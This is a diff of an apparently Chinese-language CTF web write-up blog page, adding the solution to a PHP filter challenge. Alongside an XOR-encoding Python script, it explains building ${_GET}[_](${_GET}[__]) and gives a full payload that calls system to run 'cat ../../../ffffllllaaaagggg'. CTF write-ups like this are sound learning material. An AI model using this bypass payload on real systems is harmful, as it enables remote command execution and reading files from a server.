@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-10-17.png">
 <meta property="og:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/6c258773c5fc6fca7229b978a7a27b8ff1b326f0.png">
 <meta property="article:published_time" content="2023-01-11T05:56:47.000Z">
-<meta property="article:modified_time" content="2023-01-13T01:38:34.669Z">
+<meta property="article:modified_time" content="2023-01-14T11:08:49.017Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-13-27.png">
@@ -192,6 +192,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">command</span>):</span><br><span class="line">code = <span class="string">&quot;~`!@#$%&amp;*()-=+_[]&#123;&#125;;:&lt;&gt;,.?/|&quot;</span></span><br><span class="line">result_1 = <span class="string">&quot;&quot;</span></span><br><span class="line">result_2 = <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> command.isalpha():</span><br><span class="line">        result_1 += x</span><br><span class="line">        result_2 += x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">in</span> code:</span><br><span class="line">            result_1 += y</span><br><span class="line">            result_2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;result_1&#125;</span>&quot; ^ &quot;<span class="subst">&#123;result_2&#125;</span>&quot;)&#x27;</span></span><br><span class="line">a=encode(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 
 <p>异或绕过的脚本有了，知道是绕过了，但还是不知道要构造什么（悲）</p>
+<p>（喜）看了别人的博客，又看了ctf-wiki，知道要构造什么了</p>
+<p>构造<code>$&#123;_GET&#125;[_]($&#123;_GET&#125;[__])</code> <code>_</code>和<code>__</code>分别是两个不同的变量，因为php变量只能是_,数字和字母构成，所以可以用<code>_</code>来当作变量。</p>
+<p><code>_</code>这里的变量是<code>system</code>,<code>__</code>则是所要执行的命令。<code>system</code>是用来执行系统命令的。</p>
+<p>先执行<code>ls</code>查看当前目录下的文件，没有flag，不停回退查看，终于发现flag，cat即可。</p>
+<p>payload：<code>?code=$&#123;&quot;~&#123;~~&quot; ^ &quot;!&lt;;*&quot;&#125;[_]($&#123;&quot;~&#123;~~&quot; ^ &quot;!&lt;;*&quot;&#125;[__]);&amp;_=system&amp;__=cat ../../../ffffllllaaaagggg</code></p>
 <hr>
 <h3 id="BUUCTF-极客大挑战-2019-EasySQL"><a href="#BUUCTF-极客大挑战-2019-EasySQL" class="headerlink" title="BUUCTF_[极客大挑战 2019]EasySQL"></a>BUUCTF_[极客大挑战 2019]EasySQL</h3><p>！SQL注入！</p>
 <img src="/2023/01/11/%E7%AC%AC%E4%B8%80%E5%91%A8web/Snipaste_2023-01-12_18-10-17.png" style="zoom:50%;">
